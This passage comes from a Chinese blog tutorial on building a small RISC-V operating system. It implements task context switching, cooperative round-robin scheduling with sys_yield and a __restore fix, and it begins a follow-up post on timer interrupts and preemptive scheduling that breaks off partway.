<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_STACK_SIZE (4096 * 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNEL_STACK_SIZE (4096 * 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_TASKS 10   <span class="comment">/* 操作系统支持的最大任务数量 */</span></span></span><br><span class="line"><span class="type">uint8_t</span> KernelStack[MAX_TASKS][KERNEL_STACK_SIZE]; <span class="comment">/* 任务内核栈 */</span></span><br><span class="line"><span class="type">uint8_t</span> UserStack[MAX_TASKS][USER_STACK_SIZE];    <span class="comment">/* 任务用户栈 */</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;context.h</p>
<p>定义 任务上下文结构体</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* s模式下的任务上下文*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_Context</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">reg_t</span> ra;</span><br><span class="line">	<span class="type">reg_t</span> sp;</span><br><span class="line">	<span class="type">reg_t</span> s0;</span><br><span class="line">	<span class="type">reg_t</span> s1;</span><br><span class="line">	<span class="type">reg_t</span> s2;</span><br><span class="line">	<span class="type">reg_t</span> s3;</span><br><span class="line">	<span class="type">reg_t</span> s4;</span><br><span class="line">	<span class="type">reg_t</span> s5;</span><br><span class="line">	<span class="type">reg_t</span> s6;</span><br><span class="line">	<span class="type">reg_t</span> s7;</span><br><span class="line">	<span class="type">reg_t</span> s8;</span><br><span class="line">	<span class="type">reg_t</span> s9;</span><br><span class="line">	<span class="type">reg_t</span> s10;</span><br><span class="line">	<span class="type">reg_t</span> s11;</span><br><span class="line">&#125;task_Context;</span><br></pre></td></tr></table></figure>

<p><code>ra</code>寄存器，<code>sp</code>寄存器，<code>s0~s11</code>寄存器， riscv 的函数调用寄存器保存规范：</p>
<ul>
<li><code>ra</code>：记录了<code>__switch</code>返回后应该跳转到哪里运行</li>
<li>对于一般的函数而言，Rust&#x2F;C 编译器会在函数的起始位置自动生成代码来保存 <code>s0~s11</code> 这些被调用者保存的寄存器。但 <code>__switch</code> 是一个用汇编代码写的特殊函数，它不会被 Rust&#x2F;C 编译器处理，所以我们需要在 <code>__switch</code> 中手动编写保存 <code>s0~s11</code> 的汇编代码。</li>
<li>其它寄存器中，属于调用者保存的寄存器是由编译器在高级语言编写的调用函数中自动生成的代码来完成保存的；还有一些寄存器属于临时寄存器，不需要保存和恢复。</li>
</ul>
<table>
<thead>
<tr>
<th>寄存器名称</th>
<th>寄存器别名</th>
<th>保存约定</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>t0 - t6</td>
<td>x5 - x7， x28 - x31</td>
<td>调用者</td>
<td>临时寄存器</td>
</tr>
<tr>
<td>a0 - a7</td>
<td>x10 - x17</td>
<td>调用者</td>
<td>参数&#x2F;返回值寄存器</td>
</tr>
<tr>
<td>ra</td>
<td>x1</td>
<td>调用者</td>
<td>返回地址寄存器</td>
</tr>
<tr>
<td>s0 - s11</td>
<td>x8，x9，x18 - x27</td>
<td>被调用者</td>
<td>保存寄存器</td>
</tr>
<tr>
<td>sp</td>
<td>x2</td>
<td>被调用者</td>
<td>栈指针寄存器</td>
</tr>
</tbody></table>
<p>因此，在调用<code>__switch</code>函数进行任务切换时，<strong>我们需要将当前任务的这些寄存器保存，然后将下一个要切换的任务的寄存器从拿出来然后完成寄存器替换。</strong></p>
<p>每个任务都有一个保存自己任务上下文的地方，这个地方我们定义为<code>TaskControlBlock</code>，在<code>TaskControlBlock</code>不止可以保存任务的上下文信息，还可以保存任务的运行状态</p>
<blockquote>
<p>OS&#x2F;task.h</p>
<p>定义了<code>TaskControlBlock</code>来保存任务信息，一个任务信息包括这个任务的状态何任务上下文信息</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __TASK_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __TASK_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> <span class="title">TaskState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	UnInit, <span class="comment">// 未初始化</span></span><br><span class="line">    Ready, <span class="comment">// 准备运行</span></span><br><span class="line">    Running, <span class="comment">// 正在运行</span></span><br><span class="line">    Exited, <span class="comment">// 已退出</span></span><br><span class="line">&#125;TaskState;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TaskControlBlock</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TaskState task_state; </span><br><span class="line">    task_Context task_context; </span><br><span class="line">&#125;TaskControlBlock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;task.c</p>
<p>添加 一个<code>TaskControlBlock</code>类型的数组，保存每个任务的状态信息和上下文</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_STACK_SIZE (4096 * 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNEL_STACK_SIZE (4096 * 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_TASKS 10   <span class="comment">/* 操作系统支持的最大任务数量 */</span></span></span><br><span class="line"><span class="type">uint8_t</span> KernelStack[MAX_TASKS][KERNEL_STACK_SIZE]; <span class="comment">/* 任务内核栈 */</span></span><br><span class="line"><span class="type">uint8_t</span> UserStack[MAX_TASKS][USER_STACK_SIZE];     <span class="comment">/* 任务用户栈 */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TaskControlBlock</span> <span class="title">tasks</span>[<span class="title">MAX_TASKS</span>];</span>   <span class="comment">// 任务数组，保存上下文和状态</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;task.c</p>
<p>对于当前正在执行的任务的 <code>Trap</code> 控制流，我们用一个名为 <code>current_task_cx_ptr </code>的变量来保存放置当前任务上下文的地址；而用<code>next_task_cx_ptr</code>的变量来保存放置下一个要执行任务的上下文的地址。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">TaskContext *current_task_cx_ptr = &amp;tasks[current].task_context;</span><br><span class="line">TaskContext *next_task_cx_ptr    = &amp;tasks[next].task_context;</span><br></pre></td></tr></table></figure>



<p><strong>从栈上内容的角度看待<code>__switch</code>函数的整体流程：</strong></p>
<p><img src="/2024/06/14/riscv-10-%E5%A4%9A%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6/image-20240617152834451.png" alt="image-20240617152834451"></p>
<p><code>Trap</code> 控制流在调用 <code>__switch</code> 之前就需要明确知道即将切换到哪一条目前正处于暂停状态的 <code>Trap</code> 控制流，因此 <code>__switch</code> 有两个参数，</p>
<ul>
<li>第一个参数代表它自己</li>
<li>第二个参数则代表即将切换到的那条 <code>Trap</code> 控制流。</li>
</ul>
<p>这里我们用上面提到过的 <code>current_task_cx_ptr</code> 和 <code>next_task_cx_ptr</code> 作为代表。在上图中我们假设某次 <code>__switch</code> 调用要从 Trap 控制流 A 切换到 B，一共可以分为四个阶段，在每个阶段中我们都给出了 A 和 B 内核栈上的内容。</p>
<ul>
<li><strong>阶段 [1]：</strong>在 Trap 控制流 A 调用 <code>__switch</code> 之前，A 的内核栈上只有 Trap 上下文和 Trap 处理函数的调用栈信息，而 B 是之前被切换出去的；</li>
<li><strong>阶段 [2]：</strong>A 在 A 任务上下文空间在里面保存 CPU 当前的寄存器快照；</li>
<li><strong>阶段 [3]：</strong>这一步极为关键，读取 <code>next_task_cx_ptr</code> 指向的 B 任务上下文，根据 B 任务上下文保存的内容来恢复 <code>ra</code> 寄存器、<code>s0~s11</code> 寄存器以及 <code>sp</code> 寄存器。只有这一步做完后， <code>__switch</code> 才能做到一个函数跨两条控制流执行，即 <em>通过换栈也就实现了控制流的切换</em> 。</li>
<li><strong>阶段 [4]：</strong>上一步寄存器恢复完成后，可以看到通过恢复 <code>sp</code> 寄存器换到了任务 B 的内核栈上，进而实现了控制流的切换。这就是为什么 <code>__switch</code> 能做到一个函数跨两条控制流执行。此后，当 CPU 执行 <code>ret</code> 汇编伪指令完成 <code>__switch</code> 函数返回后，任务 B 可以从调用 <code>__switch</code> 的位置继续向下执行。</li>
</ul>
<blockquote>
<p>OS&#x2F;switch.S</p>
<p>switch代码实现</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.altmacro</span><br><span class="line">.macro SAVE_SN n</span><br><span class="line">    sd s\n, (\n+2)*8(a0)</span><br><span class="line">.endm</span><br><span class="line">.macro LOAD_SN n</span><br><span class="line">    ld s\n, (\n+2)*8(a1)</span><br><span class="line">.endm</span><br><span class="line">    .section .text</span><br><span class="line">    .globl __switch</span><br><span class="line">__switch:</span><br><span class="line"></span><br><span class="line">    # 阶段 [1]</span><br><span class="line">    # __switch(</span><br><span class="line">    #     current_task_cx_ptr: *mut TaskContext,</span><br><span class="line">    #     next_task_cx_ptr: *const TaskContext</span><br><span class="line">    # )</span><br><span class="line"></span><br><span class="line">    # 阶段 [2]</span><br><span class="line">    # save kernel stack of current task</span><br><span class="line">    sd sp, 8(a0)</span><br><span class="line">    # save ra &amp; s0~s11 of current execution</span><br><span class="line">    sd ra, 0(a0)</span><br><span class="line">    .set n, 0</span><br><span class="line">    .rept 12</span><br><span class="line">        SAVE_SN %n</span><br><span class="line">        .set n, n + 1</span><br><span class="line">    .endr</span><br><span class="line"></span><br><span class="line">    # 阶段 [3]</span><br><span class="line">    # restore ra &amp; s0~s11 of next execution</span><br><span class="line">    ld ra, 0(a1)</span><br><span class="line">    .set n, 0</span><br><span class="line">    .rept 12</span><br><span class="line">        LOAD_SN %n</span><br><span class="line">        .set n, n + 1</span><br><span class="line">    .endr</span><br><span class="line">    # restore kernel stack of next task</span><br><span class="line">    ld sp, 8(a1)</span><br><span class="line">    </span><br><span class="line">    # 阶段 [4]</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>



<h2 id="2-2协作式任务调度实现"><a href="#2-2协作式任务调度实现" class="headerlink" title="2.2协作式任务调度实现"></a>2.2协作式任务调度实现</h2><blockquote>
<p>OS&#x2F;app.c</p>
<p>封装切换函数 <code>sys_yield()</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">sys_yield</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    syscall(__NR_sched_yield,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;syscall.c</p>
<p>修改一下分发函数 加上<code>yeild</code>的</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* syscall.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __SYSCALL(<span class="type">size_t</span> syscall_id, <span class="type">reg_t</span> arg1, <span class="type">reg_t</span> arg2, <span class="type">reg_t</span> arg3) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (syscall_id)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> __NR_write:</span><br><span class="line">            __sys_write(arg1, arg2, arg3);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> __NR_sched_yield:</span><br><span class="line">            __sys_yield();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            printk(<span class="string">&quot;Unsupported syscall id:%d\n&quot;</span>,syscall_id);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __sys_write(<span class="type">size_t</span> fd, <span class="type">const</span> <span class="type">char</span>* data, <span class="type">size_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(fd ==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        panic(<span class="string">&quot;Unsupported fd in sys_write!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __sys_yield() &#123;</span><br><span class="line">    schedule();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;os.h</p>
<p>添加宏定义</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_yield 124</span></span><br></pre></td></tr></table></figure>



<p><code>task.c</code>中定义了<code>schedule</code>，</p>
<blockquote>
<p>OS&#x2F;task.c</p>
<ul>
<li>首先定义了两个变量，一个用来<strong>表示当前执行的任务号，一个用来表示用户常见的任务数量。</strong></li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> _current = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> _top = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>



<ul>
<li>然后定义了一个<code>task_create(void (*task_entry)(void))</code>函数来创建任务，此函数传入的参数为一个函数指针，即用户态的应用程序的地址。<ul>
<li>在创建任务时我们首先需要为每个任务先构造该任务的<code>trap</code>上下文，包括入口地址和用户栈指针，并将其压入到内核栈顶，然后设置<code>sepc、sstatus、sp</code>寄存器的值。</li>
<li>下一步就是需要为每一个任务构造一个初始的内核任务上下文，这里会调用一个<code>tcx_init</code>的函数，在这个函数里面我们会初始化任务的任务上下文。</li>
<li>再完成<code>trap</code>上下文和任务上下文的构造后会将<code>_top</code>的值加一<strong>代表多了一个任务</strong></li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> _current = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> _top = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TaskControlBlock</span> <span class="title">tasks</span>[<span class="title">MAX_TASKS</span>];</span>   <span class="comment">// 任务数组，保存上下文和状态</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> task_Context <span class="title function_">tcx_init</span><span class="params">(<span class="type">reg_t</span> kstack_ptr)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_Context</span> <span class="title">task_ctx</span>;</span></span><br><span class="line"></span><br><span class="line">    task_ctx.ra = __restore;</span><br><span class="line">    task_ctx.sp = kstack_ptr;</span><br><span class="line">    task_ctx.s0 = <span class="number">0</span>;</span><br><span class="line">    task_ctx.s1 = <span class="number">0</span>;</span><br><span class="line">    task_ctx.s2 = <span class="number">0</span>;</span><br><span class="line">    task_ctx.s3 = <span class="number">0</span>;</span><br><span class="line">    task_ctx.s4 = <span class="number">0</span>;</span><br><span class="line">    task_ctx.s5 = <span class="number">0</span>;</span><br><span class="line">    task_ctx.s6 = <span class="number">0</span>;</span><br><span class="line">    task_ctx.s7 = <span class="number">0</span>;</span><br><span class="line">    task_ctx.s8 = <span class="number">0</span>;</span><br><span class="line">    task_ctx.s9 = <span class="number">0</span>;</span><br><span class="line">    task_ctx.s10 = <span class="number">0</span>;</span><br><span class="line">    task_ctx.s11 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> task_ctx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">task_create</span><span class="params">(<span class="type">void</span> (*task_entry)(<span class="type">void</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(_top &lt; MAX_TASKS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* 对于每个任务先构造该任务的trap上下文，包括入口地址和用户栈指针，并将其压入到内核栈顶*/</span></span><br><span class="line">        trap_Context* cx_ptr = &amp;KernelStack[_top] + KERNEL_STACK_SIZE - <span class="keyword">sizeof</span>(trap_Context);</span><br><span class="line">        <span class="type">reg_t</span> user_sp = &amp;UserStack[_top] + USER_STACK_SIZE;</span><br><span class="line">        <span class="type">reg_t</span> sstatus = r_sstatus();</span><br><span class="line">        <span class="comment">// 设置 sstatus 寄存器第8位即SPP位为0 表示为U模式</span></span><br><span class="line">        sstatus &amp;= (<span class="number">0U</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        w_sstatus(sstatus);</span><br><span class="line">        <span class="comment">/* 设置用户程序内核栈 ，填充用户栈指针*/</span></span><br><span class="line">        cx_ptr-&gt;sepc = (<span class="type">reg_t</span>)task_entry;</span><br><span class="line">        cx_ptr-&gt;sstatus = sstatus; </span><br><span class="line">        cx_ptr-&gt;sp = user_sp;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* 构造每个任务任务控制块中的任务上下文，设置 ra 寄存器为 __restore 的入口地址*/</span></span><br><span class="line">        tasks[_top].task_context = tcx_init((<span class="type">reg_t</span>)cx_ptr);</span><br><span class="line">        <span class="comment">// 初始化 TaskStatus 字段为 Ready</span></span><br><span class="line">        tasks[_top].task_state = Ready;</span><br><span class="line"></span><br><span class="line">        _top++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>然后定义了一个<code>tcx_init</code>的函数用来初始化创建的任务的任务上下文信息，传入的参数为任务的内核栈地址，<ul>
<li>这里把任务的<code>ra</code>寄存器的值设置为<code>__restore</code>，那是因为在应用真正跑起来之前，需要 CPU 第一次从内核态进入用户态。我们在上一篇文章中也介绍过实现方法，只需在内核栈上压入构造好的 Trap 上下文，然后 <code>__restore</code> 即可。但是现在我们是通过<code>__switch</code>来进行任务切换的，<strong>而<code>__switch</code>切换完成后会返回到<code>ra</code>的地方执行，我们这里第一次将<code>ra</code>设置为<code>__restore</code>，那么程序就可以从内核态切换回用户态执行了，为此我们需要定义一个<code>run_first_task()</code>的函数来完成第一次切换。</strong></li>
<li>可以看见在<code>run_first_task()</code>函数中，先构造了一个<code>_unused</code>的任务上下文，然后调用<code>__switch</code>函数让切换到<code>tasks[0]</code>进行执行，用于初始化时<code>tasks[0]</code>的<code>ra</code>被设置成了<code>__restore</code>的地址，所以就能去返回用户态运行<code>task0</code>了。需要注意的是， <code>__restore</code> 的实现需要做出变化：它 不再需要 在开头 <code>mv sp, a0</code> 了。因为在 <code>__switch</code> 之后，<code>sp</code> 就已经正确指向了我们需要的 <code>Trap </code>上下文地址。</li>
</ul>
</li>
</ul>
<figure class="highlight v"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> run_first_task()</span><br><span class="line">&#123;</span><br><span class="line">    tasks[<span class="number">0</span>]<span class="variable">.task_state</span> = Running;</span><br><span class="line">    <span class="keyword">struct</span> task_Context *next_task_cx_ptr = &amp;(tasks[<span class="number">0</span>]<span class="variable">.task_context</span>);</span><br><span class="line">    <span class="keyword">struct</span> task_Context _unused ;</span><br><span class="line"></span><br><span class="line">    __switch(&amp;_unused,next_task_cx_ptr);</span><br><span class="line">    panic(<span class="string">&quot;unreachable in run_first_task!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>最后我们来看<code>schedule()</code>函数，首先判断一下创建的任务数量不为0，然后进行轮转调度，如果下一个任务的状态是<code>ready</code>，那么就切换到下一个任务执行，并且将当前任务的状态置为<code>ready</code>。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">schedule</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (_top &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		panic(<span class="string">&quot;Num of task should be greater than zero!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 轮转调度 */</span></span><br><span class="line">    <span class="type">int</span> next = _current + <span class="number">1</span>;</span><br><span class="line">    next = next % _top;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(tasks[next].task_state == Ready)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">TaskContext</span> *<span class="title">current_task_cx_ptr</span> =</span> &amp;(tasks[_current].task_context);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">TaskContext</span> *<span class="title">next_task_cx_ptr</span> =</span> &amp;(tasks[next].task_context);</span><br><span class="line">        tasks[next].task_state = Running;</span><br><span class="line">        tasks[_current].task_state = Ready;</span><br><span class="line">        _current = next;</span><br><span class="line">        __switch(current_task_cx_ptr,next_task_cx_ptr);  <span class="comment">// 切换</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="3-测试"><a href="#3-测试" class="headerlink" title="3.测试"></a>3.测试</h1><blockquote>
<p>OS&#x2F;app.c</p>
<p>新建三个task任务测试程序</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">task_delay</span><span class="params">(<span class="keyword">volatile</span> <span class="type">int</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">	count *= <span class="number">50000</span>;</span><br><span class="line">	<span class="keyword">while</span> (count--);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">task1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *message = <span class="string">&quot;task1 is running!\n&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(message);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sys_wirte(<span class="number">1</span>,message, len);</span><br><span class="line">        task_delay(<span class="number">10000</span>);</span><br><span class="line">        sys_yield();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">task2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *message = <span class="string">&quot;task2 is running!\n&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(message);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sys_wirte(<span class="number">1</span>,message, len);</span><br><span class="line">        task_delay(<span class="number">10000</span>);</span><br><span class="line">        sys_yield();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">task3</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *message = <span class="string">&quot;task3 is running!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(message);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sys_wirte(<span class="number">1</span>,message, len);</span><br><span class="line">        task_delay(<span class="number">10000</span>);</span><br><span class="line">        sys_yield();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">task_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	task_create(task1);</span><br><span class="line">	task_create(task2);</span><br><span class="line">    task_create(task3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;main.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">os_main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;hello!!!\n&quot;</span>);</span><br><span class="line">    trap_init();</span><br><span class="line">    task_init();</span><br><span class="line">    run_first_tasks();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>sudo .&#x2F;build.sh</p>
<p>sudo .&#x2F;run.sh</p>
</blockquote>
<p>报错：</p>
<p><img src="/2024/06/14/riscv-10-%E5%A4%9A%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6/image-20240618203510960.png" alt="image-20240618203510960"></p>
<p>原因：</p>
<blockquote>
<p>OS&#x2F;kerneltrap.S</p>
<p>中的<code>mv sp, a0</code>要删掉，</p>
<ol>
<li>正常从<code>__alltraps</code>走下来的<code>trap_handler</code>流程。如果是这种情况，<code>trap_handler</code>会在<code>a0</code>里返回之前通过<code>mv a0, sp</code>传进去的<code>&amp;mut TrapContext</code>，所以这里<code>sp</code>和<code>a0</code>相同没有必要再<code>mv sp, a0</code>重新设置一遍。</li>
<li>app第一次被<code>__switch</code>的时候通过<code>__restore</code>开始运行。这时候<code>a0</code>是个无关的数据（指向上一个<code>TaskContext</code>的指针），这里再<code>mv sp a0</code>就不对了，而<code>__restore</code>要的<code>TrapContext</code>已经在<code>__switch</code>的恢复过程中被放在<code>sp</code>上了。（这个<code>sp</code>就是初始化时写完<code>TrapContext</code>后的内核栈顶）</li>
<li>所以如果存在<code>mv sp, a0</code>，则会导致 访问内存异常 因为 <code>a0</code>是个无关的数据</li>
</ol>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__restore:</span><br><span class="line">    # case1: start running app by __restore</span><br><span class="line">    # case2: back to U after handling trap</span><br><span class="line">    # mv sp, a0</span><br><span class="line">    # now sp-&gt;kernel stack(after allocated), sscratch-&gt;user stack</span><br><span class="line">    # restore sstatus/sepc</span><br><span class="line">    ld t0, 32*8(sp)</span><br><span class="line">    ld t1, 33*8(sp)</span><br><span class="line">    ld t2, 2*8(sp)</span><br><span class="line">    csrw sstatus, t0</span><br><span class="line">    csrw sepc, t1</span><br><span class="line">    csrw sscratch, t2</span><br><span class="line">    # restore general-purpuse reg</span><br></pre></td></tr></table></figure>



<blockquote>
<p>重新执行</p>
</blockquote>
<p><img src="/2024/06/14/riscv-10-%E5%A4%9A%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6/image-20240618203435306.png" alt="image-20240618203435306"></p>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-11-分时多任务与抢占式调度策略实现</title>
    <url>/2024/06/18/riscv-11-%E5%88%86%E6%97%B6%E5%A4%9A%E4%BB%BB%E5%8A%A1%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E8%B0%83%E5%BA%A6%E7%AD%96%E7%95%A5%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="1-分时多任务系统"><a href="#1-分时多任务系统" class="headerlink" title="1.分时多任务系统"></a>1.分时多任务系统</h1><p><strong>分时多任务系统：</strong>任务的切换不是通过用户程序来自行放弃cpu的使用权作为前提的，而是内核自己来决定何时切换任务，这个<strong>切换的原则就是每个任务一次只能运行一段时间，时间一到就会被操作系统强制切换到下一个任务执行</strong></p>
<p><strong>因此需要定时器来实现时钟中断</strong></p>
<h2 id="riscv的时钟中断"><a href="#riscv的时钟中断" class="headerlink" title="riscv的时钟中断"></a>riscv的时钟中断</h2><p>中断可以分为三类：</p>
<ul>
<li><strong>软件中断：</strong>由软件控制放出的中断</li>
<li><strong>时钟中断：</strong>由时钟电路发出的中断</li>
<li><strong>外部中断：</strong>由外设发出的中断</li>
</ul>
<p>当<code>scause</code>的最高位为<code>1</code>时代表此次触发的异常为中断类型：</p>
<table>
<thead>
<tr>
<th align="center">Interrupt</th>
<th align="center">Exception Code</th>
<th align="center">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">1</td>
<td align="center">Supervisor software interrupt （S模式下软件中断）</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">3</td>
<td align="center">Machine software interrupt（M模式下软件中断）</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">5</td>
<td align="center">Supervisor timer interrupt（S模式下时钟中断）</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">7</td>
<td align="center">Machine timer interrupt（M模式下时钟中断）</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">9</td>
<td align="center">Supervisor external interrupt （S模式下外部中断）</td>
</tr>
<tr>
